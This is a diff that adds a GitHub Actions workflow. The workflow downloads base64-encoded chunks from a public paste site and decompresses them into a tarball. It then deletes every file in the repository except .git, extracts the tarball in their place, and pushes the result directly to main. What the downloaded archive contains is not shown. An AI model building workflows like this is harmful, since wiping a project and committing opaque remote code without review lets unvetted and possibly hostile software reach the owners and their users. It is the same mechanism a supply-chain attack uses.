@@ -1,0 +1,37 @@
+name: Install completed B2B Lead Analyzer
+
+on:
+  push:
+    paths:
+      - .github/workflows/install-complete-app.yml
+
+permissions:
+  contents: write
+
+jobs:
+  install:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out repository
+        uses: actions/checkout@v4
+
+      - name: Download and unpack completed application
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl --fail --silent --show-error https://paste.rs/E3oqO https://paste.rs/LeHUz https://paste.rs/oKLUc https://paste.rs/Dbvai https://paste.rs/P87jB > /tmp/b2b-app.b64
+          echo "ec1db9a48f68d343aceb4f36e4db92f059c95d7ddd5cebd8659daf938fea0ba6  /tmp/b2b-app.b64" | sha256sum --check
+          base64 --decode /tmp/b2b-app.b64 > /tmp/b2b-app.tar.br
+          node -e "const fs=require('fs'),z=require('zlib');fs.writeFileSync('/tmp/b2b-app.tar',z.brotliDecompressSync(fs.readFileSync('/tmp/b2b-app.tar.br')))"
+          find . -mindepth 1 -maxdepth 1 ! -name .git -exec rm -rf {} +
+          tar -xf /tmp/b2b-app.tar
+
+      - name: Commit completed application
+        shell: bash
+        run: |
+          set -euo pipefail
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A
+          git commit -m "Deploy completed B2B Lead Analyzer"
+          git push origin HEAD:main
